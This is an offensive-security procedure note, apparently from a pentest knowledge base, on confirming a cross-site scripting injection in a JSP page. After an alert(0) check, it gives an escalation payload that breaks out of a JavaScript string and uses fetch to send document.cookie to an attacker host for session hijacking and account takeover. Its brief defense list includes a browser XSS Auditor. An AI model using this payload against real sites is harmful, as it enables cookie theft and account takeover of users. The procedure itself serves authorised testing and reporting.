---
tags:
  - xss
  - verification
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:20.244Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 1a8072b7-fa34-4d7a-b779-0cdf54b0204a
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify-XSS-Execution

## Summary

This procedure confirms successful XSS injection by observing code execution and evaluating impact, such as altering page behavior or simulating data theft.

## Description

Upon loading the payload URL, the injected JS executes in the browser context. An alert(0) popup proves control, while source inspection shows modified var t = '/project-chooser!input.jspa'. Escalate by replacing alert with fetch('http://attacker.com?cookie='+document.cookie) for exfiltration, enabling account takeovers via session hijacking.

## Requirements

1. Browser console for logging
2. Control over an external server for exfiltration testing
3. Understanding of browser security contexts

## Defense

Defensive measures and detection strategies:

- Enable XSS Auditor in browsers
- Implement strict output encoding in JSP/JS
- Detect via client-side error logs or beaconing to unknown domains

## Objectives

1. Confirm arbitrary code execution
2. Assess real-world impact like data theft
3. Document for reporting or exploitation

## Instructions

### Step 1: Load and Observe

**Context**: Trigger the page and watch for immediate effects.

Visit the encoded URL; expect alert(0) dialog.

> If alert appears, execution confirmed; dismiss and proceed.

### Step 2: Inspect and Escalate

**Context**: Verify modifications and test impact.

Open DevTools > Console; reload page. Check for errors or logs. Modify payload to exfiltrate: ';fetch("http://attacker.com?"+document.cookie);t=' and retest.

> Success: Network tab shows request to attacker server with cookies.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- verification
